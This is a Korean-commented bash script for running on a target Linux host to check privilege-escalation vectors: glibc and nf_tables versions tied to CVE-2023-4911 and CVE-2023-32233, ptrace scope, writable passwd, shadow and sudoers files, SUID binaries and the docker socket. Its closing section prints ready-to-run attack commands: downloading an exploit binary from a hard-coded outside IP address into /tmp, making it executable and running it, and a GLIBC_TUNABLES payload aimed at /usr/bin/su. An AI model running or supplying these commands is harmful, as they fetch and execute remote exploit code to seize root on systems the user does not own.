#!/bin/bash
#
# 빠른 권한 상승 체크 스크립트
# 타겟에서 실행하여 가능한 벡터 확인
#
# 사용법: bash quick_check.sh
#

echo "============================================================"
echo "권한 상승 가능 벡터 빠른 체크"
echo "============================================================"
echo ""

echo "=== 1. 기본 시스템 정보 ==="
echo "[*] Kernel:"
uname -r
echo ""
echo "[*] OS:"
cat /etc/os-release | grep PRETTY_NAME
echo ""

echo "=== 2. glibc 버전 (CVE-2023-4911 Looney Tunables) ==="
ldd --version | head -1
echo ""

echo "=== 3. Ptrace 보호 (0이면 sudo token hijacking 가능) ==="
cat /proc/sys/kernel/yama/ptrace_scope
echo ""

echo "=== 4. Netfilter/nftables (CVE-2023-32233) ==="
echo "[*] nftables 설치:"
which nft 2>/dev/null && echo "YES" || echo "NO"
echo "[*] nf_tables 모듈:"
lsmod | grep nf_tables && echo "LOADED" || echo "NOT LOADED"
echo ""

echo "=== 5. User Namespaces (unpriv) ==="
if [ -f /proc/sys/kernel/unprivileged_userns_clone ]; then
    cat /proc/sys/kernel/unprivileged_userns_clone
else
    echo "Not restricted (default enabled)"
fi
echo ""

echo "=== 6. 컴파일러 ==="
which gcc 2>/dev/null && echo "[+] gcc available" || echo "[-] gcc not found"
which cc 2>/dev/null && echo "[+] cc available" || echo "[-] cc not found"
which python3 2>/dev/null && echo "[+] python3 available" || echo "[-] python3 not found"
echo ""

echo "=== 7. Sudo 프로세스 (Token Hijacking) ==="
ps aux | grep -i sudo | grep -v grep | head -3
echo ""

echo "=== 8. 최근 Sudo 사용 (5분 이내) ==="
find /var/lib/sudo/ts -type f -mmin -5 2>/dev/null
find /var/run/sudo/ts -type f -mmin -5 2>/dev/null
echo ""

echo "=== 9. Writable /etc 파일 ==="
find /etc -writable -type f 2>/dev/null | head -10
echo ""

echo "=== 10. Writable 시스템 파일 ==="
test -w /etc/passwd && echo "[!] /etc/passwd is WRITABLE!"
test -w /etc/shadow && echo "[!] /etc/shadow is WRITABLE!"
test -w /etc/sudoers && echo "[!] /etc/sudoers is WRITABLE!"
test -w /etc/ld.so.preload && echo "[!] /etc/ld.so.preload is WRITABLE!"
echo ""

echo "=== 11. Cron Jobs (Root) ==="
cat /etc/crontab 2>/dev/null | grep -v "^#"
ls -la /etc/cron.d/ 2>/dev/null
echo ""

echo "=== 12. SUID 재확인 ==="
find /usr/bin -perm -4000 -type f 2>/dev/null | head -10
echo ""

echo "=== 13. Docker 소켓 ==="
test -w /var/run/docker.sock && echo "[!] Docker socket is WRITABLE!" || echo "[-] Not writable"
groups | grep docker && echo "[+] User in docker group!" || echo "[-] Not in docker group"
echo ""

echo "============================================================"
echo "추천 공격 벡터 우선순위:"
echo "============================================================"
echo ""

# CVE-2023-32233 체크
if lsmod | grep -q nf_tables; then
    echo "[1] CVE-2023-32233 (Netfilter) - nf_tables 모듈 로드됨!"
    echo "    wget http://13.158.67.78:5000/cve_2023_32233"
    echo ""
fi

# glibc 버전 체크
GLIBC_VER=$(ldd --version | head -1 | grep -oP '\d+\.\d+$')
echo "[2] CVE-2023-4911 (Looney Tunables) - glibc 버전: $GLIBC_VER"
echo "    env -i \"GLIBC_TUNABLES=glibc.malloc.mxfast=A\" /usr/bin/su"
echo ""

# ptrace 체크
PTRACE=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
if [ "$PTRACE" = "0" ]; then
    echo "[3] Ptrace Sudo Token Hijacking - ptrace_scope = 0"
    echo "    sudo 프로세스를 찾아 attach"
    echo ""
fi

# writable /etc
if find /etc -writable -type f 2>/dev/null | grep -q .; then
    echo "[4] Writable /etc files detected"
    echo "    find /etc -writable -type f 2>/dev/null"
    echo ""
fi

echo "============================================================"
echo "즉시 실행 가능한 명령어:"
echo "============================================================"
echo ""
echo "# nf_tables exploit 다운로드 및 실행"
echo "cd /tmp"
echo "wget http://13.158.67.78:5000/cve_2023_32233"
echo "chmod +x cve_2023_32233"
echo "./cve_2023_32233"
echo ""
echo "# 또는 Looney Tunables 테스트"
echo "env -i \"GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A\" \"Z=B\" /usr/bin/su --help"
echo ""
